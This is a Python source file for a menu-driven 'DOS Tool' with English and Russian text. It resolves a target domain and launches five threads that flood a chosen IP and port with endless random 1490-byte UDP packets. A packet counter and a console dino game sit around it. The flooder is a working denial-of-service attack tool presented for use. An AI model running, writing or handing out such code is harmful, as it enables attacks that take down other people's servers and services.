import os
import time
import socket
import random
from datetime import datetime
import threading
import sys

# Language dictionaries
LANGUAGES = {
    "en": {
        "banner": r"""
 ____   ___   ____     _____           _ 
|  _ \ / _ \ / ___|   |_   _|__   ___ | |
| | | | | | | \___ \    | |/ _ \ / _ \| |
| |_| | |_| |  ___) |   | | (_) | (_) | |
|____/ \___/ |_____/    |_|\___/ \___/|_|
                DOS Tool
| Dev: SashaVoden
| Github: github.com/SashaVoden
""",
        "menu_1": "1. Resolve domain to IP",
        "menu_2": "2. Start DOS script",
        "menu_3": "3. Change language",
        "menu_0": "0. Exit",
        "select_option": "Select an option: ",
        "invalid_choice": "Invalid choice!",
        "goodbye": "Goodbye!",
        "enter_domain": "Enter domain (e.g. example.com): ",
        "domain_resolved": "Domain {domain} resolved to IP: {ip}, Port: {port}",
        "error_resolve": "Error resolving domain: {e}",
        "press_enter": "Press Enter to return to menu...",
        "script_started": "Script started: {time}",
        "ip_target": "IP Target or exit: ",
        "exiting": "Exiting script...",
        "invalid_port": "Invalid port!",
        "port": "Port: ",
        "target": "Target:",
        "thread": "Thread",
        "packets_sent": "Packets sent:",
        "menu_lang": "Select language (en/ru): ",
        "lang_changed": "Language changed to {lang}."
    },
    "ru": {
        "banner": r"""
 ____   ___   ____     _____           _ 
|  _ \ / _ \ / ___|   |_   _|__   ___ | |
| | | | | | | \___ \    | |/ _ \ / _ \| |
| |_| | |_| |  ___) |   | | (_) | (_) | |
|____/ \___/ |_____/    |_|\___/ \___/|_|
                DOS Tool
| Dev: SashaVoden
| Github: github.com/SashaVoden
""",
        "menu_1": "1. Определить IP по домену",
        "menu_2": "2. Запустить DOS скрипт",
        "menu_3": "3. Сменить язык",
        "menu_0": "0. Выход",
        "select_option": "Выберите опцию: ",
        "invalid_choice": "Неверный выбор!",
        "goodbye": "До свидания!",
        "enter_domain": "Введите домен (например, example.com): ",
        "domain_resolved": "Домен {domain} определён как IP: {ip}, Порт: {port}",
        "error_resolve": "Ошибка при определении домена: {e}",
        "press_enter": "Нажмите Enter для возврата в меню...",
        "script_started": "Скрипт запущен: {time}",
        "ip_target": "Целевой IP или exit: ",
        "exiting": "Выход из скрипта...",
        "invalid_port": "Неверный порт!",
        "port": "Порт: ",
        "target": "Цель:",
        "thread": "Поток",
        "packets_sent": "Пакетов отправлено:",
        "menu_lang": "Выберите язык (en/ru): ",
        "lang_changed": "Язык изменён на {lang}."
    }
}

current_lang = "en"

def tr(key, **kwargs):
    return LANGUAGES[current_lang][key].format(**kwargs)

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_banner():
    print(tr("banner"))

def progress_bar():
    stages = [
        "[                    ] 0% ",
        "[=====               ] 25%",
        "[==========          ] 50%",
        "[===============     ] 75%",
        "[====================] 100%\n"
    ]
    for stage in stages:
        print(stage)
        time.sleep(1)

def attack(ip, port, idx, counters):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1490)
    while True:
        try:
            sock.sendto(bytes_data, (ip, port))
            counters[idx] += 1
        except Exception:
            break

def print_status(counters, ip, port):
    while True:
        clear_screen()
        print_banner()
        print(f"{tr('target')} {ip} {tr('port')}{port}")
        for i, count in enumerate(counters):
            print(f"{tr('thread')} {i+1:<2} ({tr('port')}{port}): {tr('packets_sent')} {count:<8}")
        time.sleep(0.1)

def resolve_domain():
    domain = input(tr("enter_domain"))
    try:
        ip = socket.gethostbyname(domain)
        port = input(tr("port"))
        print(tr("domain_resolved", domain=domain, ip=ip, port=port))
    except Exception as e:
        print(tr("error_resolve", e=e))
    input(tr("press_enter"))

def ddos_menu():
    now = datetime.now()
    print(tr("script_started", time=now.strftime('%Y-%m-%d %H:%M:%S')))
    clear_screen()
    print_banner()
    ip_or_domain = input(tr("ip_target"))
    if ip_or_domain.lower() == "exit":
        print(tr("exiting"))
        time.sleep(1)
        clear_screen()
        return
    try:
        ip = socket.gethostbyname(ip_or_domain)
        if ip != ip_or_domain:
            print(f"Resolved target: {ip_or_domain} -> {ip}")
    except Exception:
        print(tr("error_resolve", e="Invalid domain or IP!"))
        return
    try:
        port = int(input(tr("port")))
    except ValueError:
        print(tr("invalid_port"))
        return

    progress_bar()
    counters = [0] * 5
    threads = []
    for i in range(5):
        t = threading.Thread(target=attack, args=(ip, port, i, counters))
        t.daemon = True
        t.start()
        threads.append(t)
    status_thread = threading.Thread(target=print_status, args=(counters, ip, port), daemon=True)
    status_thread.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping...")
        time.sleep(1)

def change_language():
    global current_lang
    lang = input(tr("menu_lang")).strip().lower()
    if lang in LANGUAGES:
        current_lang = lang
        print(tr("lang_changed", lang=lang))
    else:
        print("Language not supported!")
    time.sleep(1)

def dino_game():
    import msvcrt

    WIDTH = 40
    HEIGHT = 7
    GROUND = HEIGHT - 2
    dino = ["  |•\ ", "  /|\\ ", "  /\\ "]
    dino_x = 2
    dino_y = GROUND
    jump = False
    jump_height = 0
    max_jump = 3
    cactus_list = []
    score = 0
    game_over = False

    def draw():
        clear_screen()
        field = [[" " for _ in range(WIDTH)] for _ in range(HEIGHT)]
        # Draw ground
        for x in range(WIDTH):
            field[GROUND+1][x] = "_"
        # Draw dino
        for i, line in enumerate(dino):
            for j, ch in enumerate(line):
                if 0 <= dino_y - (2 - i) < HEIGHT and 0 <= dino_x + j < WIDTH:
                    field[dino_y - (2 - i)][dino_x + j] = ch
        # Draw cactuses
        for cx in cactus_list:
            if 0 <= cx < WIDTH:
                field[GROUND][cx] = "#"
        # Print field
        for row in field:
            print("".join(row))
        print(f"Score: {score}")
        if game_over:
            print("Game Over! Press ESC to exit or R to restart.")

    while True:
        dino_y = GROUND - jump_height
        if not game_over:
            # Move cactuses
            cactus_list = [c - 1 for c in cactus_list if c - 1 >= 0]
            # Spawn cactus
            if random.randint(0, 9) == 0:
                cactus_list.append(WIDTH - 1)
            # Collision
            for cx in cactus_list:
                if dino_x + 2 <= cx <= dino_x + 5 and dino_y + 1 >= GROUND:
                    game_over = True
            # Jump logic
            if jump:
                jump_height += 1
                if jump_height >= max_jump:
                    jump = False
            else:
                if jump_height > 0:
                    jump_height -= 1
            score += 1
        draw()
        # Input
        start_time = time.time()
        while time.time() - start_time < 0.08:
            if msvcrt.kbhit():
                key = msvcrt.getch()
                if key == b' ' and not game_over and jump_height == 0:
                    jump = True
                elif key in (b'\x1b', b'q'):  # ESC or q
                    return
                elif key in (b'r', b'R') and game_over:
                    # Restart
                    cactus_list = []
                    score = 0
                    jump = False
                    jump_height = 0
                    game_over = False
        if game_over:
            time.sleep(0.1)

def main_menu():
    while True:
        clear_screen()
        print_banner()
        print(tr("menu_1"))
        print(tr("menu_2"))
        print(tr("menu_3"))
        print("4. Play Dino Game")
        print(tr("menu_0"))
        choice = input("\n" + tr("select_option"))
        if choice == "1":
            clear_screen()
            resolve_domain()
        elif choice == "2":
            clear_screen()
            ddos_menu()
        elif choice == "3":
            clear_screen()
            change_language()
        elif choice == "4":
            clear_screen()
            dino_game()
        elif choice == "0":
            print(tr("goodbye"))
            break
        else:
            print(tr("invalid_choice"))
            time.sleep(1)

if __name__ == "__main__":
    main_menu()